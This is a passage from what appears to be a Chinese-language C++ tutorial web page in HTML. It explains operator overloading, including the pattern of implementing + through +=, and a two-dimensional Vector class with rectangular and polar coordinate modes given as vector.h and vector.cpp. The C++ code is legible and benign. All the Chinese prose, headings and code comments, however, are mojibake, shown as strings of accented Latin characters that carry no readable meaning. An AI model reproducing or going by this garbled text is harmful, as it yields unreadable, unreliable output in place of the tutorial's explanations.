<code>-=</code>ï¼‰å®ç°ä¸º<strong>æˆå‘˜å‡½æ•°</strong>ã€‚</li><li> å°†å¯¹åº”çš„<strong>äºŒå…ƒè¿ç®—ç¬¦</strong>ï¼ˆå¦‚ <code>+</code>, <code>-</code>ï¼‰å®ç°ä¸º<strong>éæˆå‘˜å‹å…ƒå‡½æ•°</strong>ï¼Œå¹¶åœ¨å…¶å†…éƒ¨è°ƒç”¨å¤åˆèµ‹å€¼è¿ç®—ç¬¦æ¥å®Œæˆå®é™…å·¥ä½œã€‚</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¤ºä¾‹æ¨¡å¼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Time&amp; <span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t); <span class="comment">// æˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="keyword">friend</span> Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2); <span class="comment">// éæˆå‘˜å‹å…ƒ</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t) &#123;</span><br><span class="line">    <span class="comment">// ... å®ç° += é€»è¾‘ ...</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// operator+ è°ƒç”¨ operator+=</span></span><br><span class="line">Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2) &#123;</span><br><span class="line">    Time sum = t1; <span class="comment">// åˆ›å»ºä¸€ä¸ªå‰¯æœ¬</span></span><br><span class="line">    sum += t2;     <span class="comment">// ä½¿ç”¨æˆå‘˜å‡½æ•° +=</span></span><br><span class="line">    <span class="keyword">return</span> sum;    <span class="comment">// è¿”å›ç»“æœ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§æ¨¡å¼å¯ä»¥å‡å°‘ä»£ç é‡å¤ã€‚</p><h2 id="11-5-å†è¯»é‡è½½ï¼šä¸€ä¸ªçŸ¢é‡ç±»"><a href="#11-5-å†è¯»é‡è½½ï¼šä¸€ä¸ªçŸ¢é‡ç±»" class="headerlink" title="11.5 å†è¯»é‡è½½ï¼šä¸€ä¸ªçŸ¢é‡ç±»"></a>11.5 å†è¯»é‡è½½ï¼šä¸€ä¸ªçŸ¢é‡ç±»</h2><p>æœ¬èŠ‚æˆ‘ä»¬å°†é€šè¿‡å®šä¹‰ä¸€ä¸ªè¡¨ç¤ºäºŒç»´çŸ¢é‡ï¼ˆæˆ–å‘é‡ï¼‰çš„ç±»ï¼Œè¿›ä¸€æ­¥æ¢è®¨è¿ç®—ç¬¦é‡è½½çš„åº”ç”¨ã€‚çŸ¢é‡æ—¢å¯ä»¥ç”¨ç›´è§’åæ ‡ (x, y) è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨æåæ ‡ (å¤§å°/æ¨¡, è§’åº¦) è¡¨ç¤ºã€‚æˆ‘ä»¬çš„ <code>Vector</code> ç±»å°†èƒ½å¤Ÿå­˜å‚¨è¿™ä¸¤ç§è¡¨ç¤ºï¼Œå¹¶å…è®¸ç”¨æˆ·åœ¨å®ƒä»¬ä¹‹é—´åˆ‡æ¢ã€‚</p><h3 id="11-5-1-ä½¿ç”¨çŠ¶æ€æˆå‘˜"><a href="#11-5-1-ä½¿ç”¨çŠ¶æ€æˆå‘˜" class="headerlink" title="11.5.1 ä½¿ç”¨çŠ¶æ€æˆå‘˜"></a>11.5.1 ä½¿ç”¨çŠ¶æ€æˆå‘˜</h3><p>ä¸ºäº†åŒæ—¶æ”¯æŒç›´è§’åæ ‡å’Œæåæ ‡ï¼Œæˆ‘ä»¬çš„ <code>Vector</code> ç±»éœ€è¦åŒ…å«ç›¸åº”çš„æˆå‘˜ï¼š</p><ul><li>  <code>x</code>: x åˆ†é‡</li><li>  <code>y</code>: y åˆ†é‡</li><li>  <code>mag</code>: çŸ¢é‡çš„å¤§å°ï¼ˆæ¨¡ï¼‰</li><li>  <code>ang</code>: çŸ¢é‡çš„è§’åº¦</li></ul><p>åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªçŠ¶æ€æˆå‘˜æ¥æŒ‡ç¤ºå½“å‰å¯¹è±¡æ˜¯ä»¥å“ªç§æ¨¡å¼è¡¨ç¤ºçš„ï¼ˆç›´è§’åæ ‡æˆ–æåæ ‡ï¼‰ï¼Œä»¥åŠä¸€äº›æ–¹æ³•æ¥æ ¹æ®ä¸€ç§è¡¨ç¤ºè®¡ç®—å¦ä¸€ç§è¡¨ç¤ºã€‚</p><p><strong>vector.h (ç±»å®šä¹‰)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\vector.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> VECTOR_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VECTOR_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> VECTOR &#123; <span class="comment">// å°†ç±»æ”¾å…¥å‘½åç©ºé—´</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// æšä¸¾ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºæ¨¡å¼ï¼šç›´è§’åæ ‡(RECT) æˆ– æåæ ‡(POL)</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">Mode</span> &#123;</span>RECT, POL&#125;;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">double</span> x;       <span class="comment">// x åˆ†é‡</span></span><br><span class="line">        <span class="keyword">double</span> y;       <span class="comment">// y åˆ†é‡</span></span><br><span class="line">        <span class="keyword">double</span> mag;     <span class="comment">// çŸ¢é‡çš„å¤§å° (æ¨¡)</span></span><br><span class="line">        <span class="keyword">double</span> ang;     <span class="comment">// çŸ¢é‡çš„è§’åº¦ (å¼§åº¦)</span></span><br><span class="line">        Mode mode;      <span class="comment">// å½“å‰æ¨¡å¼ (RECT æˆ– POL)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç§æœ‰è¾…åŠ©å‡½æ•°ï¼Œç”¨äºæ ¹æ®ä¸€ç§è¡¨ç¤ºè®¡ç®—å¦ä¸€ç§è¡¨ç¤º</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_mag</span><span class="params">()</span></span>; <span class="comment">// æ ¹æ® x, y è®¡ç®— mag</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_ang</span><span class="params">()</span></span>; <span class="comment">// æ ¹æ® x, y è®¡ç®— ang (å¼§åº¦)</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_x</span><span class="params">()</span></span>;   <span class="comment">// æ ¹æ® mag, ang è®¡ç®— x</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set_y</span><span class="params">()</span></span>;   <span class="comment">// æ ¹æ® mag, ang è®¡ç®— y</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">        Vector(); <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="comment">// æ ¹æ®æŒ‡å®šæ¨¡å¼å’Œå€¼æ„é€ </span></span><br><span class="line">        Vector(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form = RECT);</span><br><span class="line">        <span class="comment">// é‡ç½®çŸ¢é‡</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">reset</span><span class="params">(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form = RECT)</span></span>;</span><br><span class="line">        ~Vector(); <span class="comment">// ææ„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–å„åˆ†é‡çš„å€¼</span></span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">xval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">yval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">magval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> mag; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">double</span> <span class="title">angval</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// è¿”å›è§’åº¦ (åº¦)</span></span><br><span class="line">             <span class="comment">// å°†å¼§åº¦è½¬æ¢ä¸ºåº¦</span></span><br><span class="line">             <span class="keyword">if</span> (ang == <span class="number">0.0</span> &amp;&amp; x == <span class="number">0.0</span> &amp;&amp; y == <span class="number">0.0</span>) <span class="keyword">return</span> <span class="number">0.0</span>; <span class="comment">// å¤„ç†é›¶å‘é‡</span></span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span> (ang == <span class="number">0.0</span> &amp;&amp; x &gt; <span class="number">0.0</span>) <span class="keyword">return</span> <span class="number">0.0</span>; <span class="comment">// xè½´æ­£æ–¹å‘</span></span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span> (ang == <span class="number">0.0</span> &amp;&amp; x &lt; <span class="number">0.0</span>) <span class="keyword">return</span> <span class="number">180.0</span>; <span class="comment">// xè½´è´Ÿæ–¹å‘ (atan2ä¼šå¤„ç†)</span></span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">return</span> ang * <span class="number">180.0</span> / <span class="number">3.141592653589793</span>; <span class="comment">// å‡è®¾ M_PI ä¸å¯ç”¨</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®æ¨¡å¼</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">polar_mode</span><span class="params">()</span></span>; <span class="comment">// è®¾ç½®ä¸ºæåæ ‡æ¨¡å¼</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">rect_mode</span><span class="params">()</span></span>;  <span class="comment">// è®¾ç½®ä¸ºç›´è§’åæ ‡æ¨¡å¼</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- è¿ç®—ç¬¦é‡è½½ ---</span></span><br><span class="line">        <span class="comment">// åŠ æ³•: Vector + Vector</span></span><br><span class="line">        Vector <span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span>;</span><br><span class="line">        <span class="comment">// å‡æ³•: Vector - Vector</span></span><br><span class="line">        Vector <span class="keyword">operator</span>-(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span>;</span><br><span class="line">        <span class="comment">// å–å: -Vector</span></span><br><span class="line">        Vector <span class="keyword">operator</span>-() <span class="keyword">const</span>;</span><br><span class="line">        <span class="comment">// ä¹˜æ³•: double * Vector (å‹å…ƒ) æˆ– Vector * double (æˆå‘˜æˆ–å‹å…ƒ)</span></span><br><span class="line">        Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- å‹å…ƒå‡½æ•° ---</span></span><br><span class="line">        <span class="comment">// ä¹˜æ³•: double * Vector</span></span><br><span class="line">        <span class="keyword">friend</span> Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n, <span class="keyword">const</span> Vector &amp; a);</span><br><span class="line">        <span class="comment">// è¾“å‡º: cout &lt;&lt; Vector</span></span><br><span class="line">        <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Vector &amp; v);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace VECTOR</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// VECTOR_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>vector.cpp (ç±»å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\vector.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // ä¸ºäº†ä½¿ç”¨ sqrt, atan, atan2, sin, cos</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vector.h&quot;</span> <span class="comment">// åŒ…å«ç±»å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> VECTOR &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§’åº¦è½¬æ¢å¸¸é‡ (å¦‚æœ cmath æ²¡æœ‰å®šä¹‰ M_PI)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> Rad_to_deg = <span class="number">180.0</span> / <span class="number">3.141592653589793</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- ç§æœ‰è¾…åŠ©å‡½æ•° ---</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_mag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mag = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(x * x + y * y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_ang</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0.0</span> &amp;&amp; y == <span class="number">0.0</span>)</span><br><span class="line">            ang = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ang = <span class="built_in">std</span>::<span class="built_in">atan2</span>(y, x); <span class="comment">// atan2 å¤„ç†æ‰€æœ‰è±¡é™</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        x = mag * <span class="built_in">std</span>::<span class="built_in">cos</span>(ang);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_y</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        y = mag * <span class="built_in">std</span>::<span class="built_in">sin</span>(ang);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- å…¬æœ‰æ–¹æ³• ---</span></span><br><span class="line">    Vector::Vector() &#123; <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">        x = y = mag = ang = <span class="number">0.0</span>;</span><br><span class="line">        mode = RECT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®æ¨¡å¼æ„é€ </span></span><br><span class="line">    Vector::Vector(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form) &#123;</span><br><span class="line">        mode = form;</span><br><span class="line">        <span class="keyword">if</span> (form == RECT) &#123;</span><br><span class="line">            x = n1;</span><br><span class="line">            y = n2;</span><br><span class="line">            set_mag();</span><br><span class="line">            set_ang();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (form == POL) &#123;</span><br><span class="line">            mag = n1;</span><br><span class="line">            ang = n2 / Rad_to_deg; <span class="comment">// å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦</span></span><br><span class="line">            set_x();</span><br><span class="line">            set_y();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Incorrect 3rd argument to Vector() -- &quot;</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;vector set to 0\n&quot;</span>;</span><br><span class="line">            x = y = mag = ang = <span class="number">0.0</span>;</span><br><span class="line">            mode = RECT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡ç½®çŸ¢é‡</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::reset</span><span class="params">(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form)</span> </span>&#123;</span><br><span class="line">        mode = form;</span><br><span class="line">        <span class="keyword">if</span> (form == RECT) &#123;</span><br><span class="line">            x = n1;</span><br><span class="line">            y = n2;</span><br><span class="line">            set_mag();</span><br><span class="line">            set_ang();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (form == POL) &#123;</span><br><span class="line">            mag = n1;</span><br><span class="line">            ang = n2 / Rad_to_deg; <span class="comment">// è§’åº¦è½¬å¼§åº¦</span></span><br><span class="line">            set_x();</span><br><span class="line">            set_y();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Incorrect 3rd argument to Vector::reset() -- &quot;</span>;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;vector set to 0\n&quot;</span>;</span><br><span class="line">             x = y = mag = ang = <span class="number">0.0</span>;</span><br><span class="line">             mode = RECT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Vector::~Vector() &#123; <span class="comment">// ææ„å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::polar_mode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mode = POL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::rect_mode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mode = RECT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- è¿ç®—ç¬¦é‡è½½å®ç° ---</span></span><br><span class="line">    <span class="comment">// åŠ æ³• (é€šå¸¸åœ¨ç›´è§’åæ ‡ä¸‹è®¡ç®—)</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(x + b.x, y + b.y); <span class="comment">// è¿”å›ä¸€ä¸ªæ–°çš„ Vector å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‡æ³•</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>-(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(x - b.x, y - b.y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å–å</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>-() <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(-x, -y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹˜æ³• (Vector * double)</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>*(<span class="keyword">double</span> n) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(x * n, y * n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- å‹å…ƒå‡½æ•°å®ç° ---</span></span><br><span class="line">    <span class="comment">// ä¹˜æ³• (double * Vector)</span></span><br><span class="line">    Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n, <span class="keyword">const</span> Vector &amp; a) &#123;</span><br><span class="line">        <span class="keyword">return</span> a * n; <span class="comment">// è°ƒç”¨æˆå‘˜å‡½æ•° a.operator*(n)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡º (æ ¹æ®æ¨¡å¼é€‰æ‹©è¾“å‡ºæ ¼å¼)</span></span><br><span class="line">    <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Vector &amp; v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v.mode == Vector::RECT) &#123;</span><br><span class="line">            os &lt;&lt; <span class="string">&quot;(x,y) = (&quot;</span> &lt;&lt; v.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; v.y &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v.mode == Vector::POL) &#123;</span><br><span class="line">            os &lt;&lt; <span class="string">&quot;(m,a) = (&quot;</span> &lt;&lt; v.mag &lt;&lt; <span class="string">&quot;, &quot;</span></span><br><span class="line">               &lt;&lt; v.ang * Rad_to_deg &lt;&lt; <span class="string">&quot;)&quot;</span>; <span class="comment">// è¾“å‡ºè§’åº¦</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            os &lt;&lt; <span class="string">&quot;Vector object mode is invalid&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// end namespace VECTOR</span></span><br></pre></td></tr></table></figure><h3 id="11-5-2-ä¸º-Vector-ç±»é‡è½½ç®—æœ¯è¿ç®—ç¬¦"><a href="#11-5-2-ä¸º-Vector-ç±»é‡è½½ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="11.5.2 ä¸º Vector ç±»é‡è½½ç®—æœ¯è¿ç®—ç¬¦"></a>11.5.2 ä¸º Vector ç±»é‡è½½ç®—æœ¯è¿ç®—ç¬¦</h3><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„ä»£ç ä¸­å·²ç»å®ç°äº†å‡ ä¸ªè¿ç®—ç¬¦çš„é‡è½½ï¼š</p><ul><li>  <code>operator+</code>: ä¸¤ä¸ª <code>Vector</code> ç›¸åŠ ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ <code>Vector</code>ã€‚è®¡ç®—åœ¨ç›´è§’åæ ‡ä¸‹è¿›è¡Œã€‚</li><li>  <code>operator-</code>: ä¸¤ä¸ª <code>Vector</code> ç›¸å‡ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ <code>Vector</code>ã€‚</li><li>  <code>operator-</code> (ä¸€å…ƒ): å¯¹ <code>Vector</code> å–åï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ <code>Vector</code>ã€‚</li><li>  <code>operator*</code>: <code>Vector</code> ä¹˜ä»¥ä¸€ä¸ª <code>double</code>ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ <code>Vector</code>ã€‚</li><li>  <code>operator*</code> (å‹å…ƒ): <code>double</code> ä¹˜ä»¥ä¸€ä¸ª <code>Vector</code>ï¼Œé€šè¿‡è°ƒç”¨æˆå‘˜å‡½æ•°ç‰ˆæœ¬å®ç°ã€‚</li><li>  <code>operator&lt;&lt;</code> (å‹å…ƒ): å°† <code>Vector</code> è¾“å‡ºåˆ° <code>ostream</code>ï¼Œæ ¹æ®å½“å‰æ¨¡å¼é€‰æ‹©è¾“å‡ºæ ¼å¼ã€‚</li></ul><h3 id="11-5-3-å¯¹å®ç°çš„è¯´æ˜"><a href="#11-5-3-å¯¹å®ç°çš„è¯´æ˜" class="headerlink" title="11.5.3 å¯¹å®ç°çš„è¯´æ˜"></a>11.5.3 å¯¹å®ç°çš„è¯´æ˜</h3><ul><li>  <strong>å‘½åç©ºé—´:</strong> å°† <code>Vector</code> ç±»åŠå…¶ç›¸å…³å‡½æ•°æ”¾å…¥ <code>VECTOR</code> å‘½åç©ºé—´ï¼Œä»¥é¿å…æ½œåœ¨çš„åç§°å†²çªã€‚</li><li>  <strong>åæ ‡è®¡ç®—:</strong> ç®—æœ¯è¿ç®—ï¼ˆåŠ 